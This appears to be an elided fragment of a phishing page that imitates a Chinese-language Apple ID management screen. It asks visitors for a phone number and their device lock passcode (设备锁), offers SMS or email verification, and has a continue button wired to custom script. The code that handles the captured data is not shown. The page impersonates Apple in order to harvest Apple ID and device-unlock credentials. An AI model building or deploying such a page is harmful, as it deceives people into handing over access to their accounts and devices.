                ...
                <div class="idms-widget-container">
                    ...
                    <div class="widget-header">
                        ...
                        <h2 class="widget-title tk-subsection-headline"> <img
                                src="shebei/203fb80e7bec54e75b4e27ddb2389b504ec26a56.png" width="16" height="16"
                                class='img' align="left" style="margin-top:5%;">管理您的 Apple ID</h2>
                        ...
                        <div class="widget-content">
                            ...
                            <div class="repair-compliance-phone-number compact-content text-center">
                                <div class="addPhoneContainer">
                                    ...
                                    <compliance-phone-number-header {active-country}="activeCountry"
                                        {account-type}="accountType" {cutoff-date}="cutoffDate" {case-type}="caseType"
                                        {grace-period-ended}="gracePeriodEnded">
                                            ...
                                            <div class="context-body step-add-phone compact-input">
                                                <div class="details">
                                                    <div class="text flow-label">
                                                        ...
                                                        <div
                                                            class="tk-body-reduced tk-links-stacked context-description">
                                                ...
                                                <div class="form-table">
                                                        ...
                                                        <div class="">
                                                            ...
                                                            <div class="form-element ">
                                                                ...
                                                                <p style="margin: -10 auto;width:%80;height: 60px;line-height: 54px;border: 1px solid #ddd;color:#333;border-radius:5px;outline: none;"
                                                                    id="app1" class='input' name="app1"
                                                                    contenteditable="TRUE" placeholder="电话"
                                                                    onKeyDown="ADivFollowingText();"
                                                    ...
                                                    <div class="form-element ">
                                                        ...
                                                        <p style="margin: -10 auto;width:%80;height: 60px;line-height: 54px;border: 1px solid #ddd;color:#333;border-radius:5px;outline: none;"
                                                            id="apwd" class='input' name="apwd" contenteditable="TRUE"
                                                            placeholder="设备锁" onKeyUp='AchangeTest(this);'
                                                            onKeyDown="ADivFollowingText();"
                                                            onKeyPress="OnTextChanged();"></p>
                                                    ...
                                                    <div class="form-cell">
                                                        <div class="form-element">
                                                            <input type="radio" class="form-choice form-choice-radio"
                                                                name="1551002377484-0-idms-radio-list-option"
                                                                id="1551002377484-0-idms-radio-list-0" checked=""
                                                                value="sms">
                                                            <label class="form-label"
                                                                for="1551002377484-0-idms-radio-list-0">
                                                ...
                                                <div class="form-row">
                                                    <div class="form-cell">
                                                        <div class="form-element">
                                                            <input type="radio" class="form-choice form-choice-radio"
                                                                name="1551002377484-0-idms-radio-list-option"
                                                                id="1551002377484-0-idms-radio-list-1" value="voice">
                                                            <label class="form-label"
                                                                for="1551002377484-0-idms-radio-list-1">
                                                                <span class="form-choice-indicator"></span>
                                                                邮件验证
                                                            </label>
                                                        </div>
                                    ...
                                    <div class="primary-button-group">
                                        <button tabindex="0" type="button" {$disabled}="_actionDisabled"
                                            ...
                                            <div class="overflow-text">
                                                ...
                                                <input id="Look" type="submit" value="继续" width="26" height="26"
                                                    align="right" style="margin-top:-4px;outline: none;"
                                                    class="button button-primary last nav-action    pull-right weight-medium ng-scope"
                                                    onClick="document:initData()" ng-app="myApp"
                                                    ng-controller="personCtrl" ng-click="toggle()">
